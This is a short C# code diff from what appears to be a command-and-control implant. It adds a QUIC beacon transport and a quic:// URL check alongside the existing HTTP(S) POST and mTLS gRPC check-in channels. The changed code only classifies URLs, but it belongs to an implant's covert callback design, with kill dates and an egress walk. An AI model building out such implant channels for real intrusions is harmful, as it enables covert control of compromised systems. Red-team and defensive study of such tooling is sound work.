@@ -12,8 +12,9 @@ namespace Rod.Implant.Internal;
 
 // How a check-in client's run ended for the program's coordinator: terminated
 // for good, or yielded because the egress walk's current beacon URL belongs
-// to the other client -- a web URL (http(s)://) runs the envelope POST cycle,
-// a bare host:port runs the mTLS gRPC stream.
+// to another client -- a web URL (http(s)://) runs the envelope POST cycle,
+// a bare host:port runs the mTLS gRPC stream, a quic-schemed URL runs the
+// QUIC stream.
 internal enum CheckInExit
 {
     // The kill date passed or the server refused the handshake permanently.
@@ -67,17 +68,21 @@ internal sealed record CheckInSetup(
     Cadence Cadence);
 
 /// <summary>
-/// The two beacon URL shapes (architecture.md Sec 8): a schemed http(s) URL
+/// The beacon URL shapes (architecture.md Sec 8): a schemed http(s) URL
 /// names a web front whose check-in the envelope POST cycle carries; a bare
-/// host:port is the mTLS socket the gRPC stream dials. Shared by both
-/// clients and the coordinator, and mirrored by the build unit when it
-/// selects which transport modules a build compiles.
+/// host:port is the mTLS socket the gRPC stream dials; a quic-schemed URL
+/// is the QUIC stream's dial. Shared by the clients and the coordinator,
+/// and mirrored by the build unit when it selects which transport modules a
+/// build compiles.
 /// </summary>
 internal static class BeaconUrl
 {
     public static bool IsWeb(string beaconUrl)
         => beaconUrl.Trim().StartsWith("http://", StringComparison.OrdinalIgnoreCase)
            || beaconUrl.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase);
+
+    public static bool IsQuic(string beaconUrl)
+        => beaconUrl.Trim().StartsWith("quic://", StringComparison.OrdinalIgnoreCase);
 }
 
 /// <summary>
